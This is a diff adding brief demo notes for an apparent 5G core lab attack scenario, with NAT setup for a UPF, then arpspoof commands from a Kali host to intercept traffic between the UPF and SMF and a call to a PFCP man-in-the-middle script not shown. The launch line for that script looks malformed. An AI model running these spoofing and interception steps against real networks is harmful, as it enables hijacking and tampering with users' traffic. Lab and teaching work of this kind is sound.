@@ -1,0 +1,21 @@
+Attack Scenario 10 DEMO:
+
+Configuration for UPF VMWare
+In case cannot ping 8.8.8.8
+
+1) echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+2) sudo iptables -t nat -A POSTROUTING -s 10.45.0.0/16 -o ens33 -j MASQUERADE
+
+
+3) Restart upf and smf
+4) Show normal scenario where UE can ping 8.8.8.8
+
+5) Kali Attacker spoof UPF and SMF
+sudo arpspoof -i eth0 -t 192.168.37.140 192.168.37.143
+sudo arpspoof -i eth0 -t 192.168.37.143 192.168.37.140
+
+6) Perform the attack
+cd Desktop
+sudo python /home/kali/Desktop/ITP/bin/python3 pfcp_mitm_modifier.py
+
+7) Connects UE and tries to ping 8.8.8.8
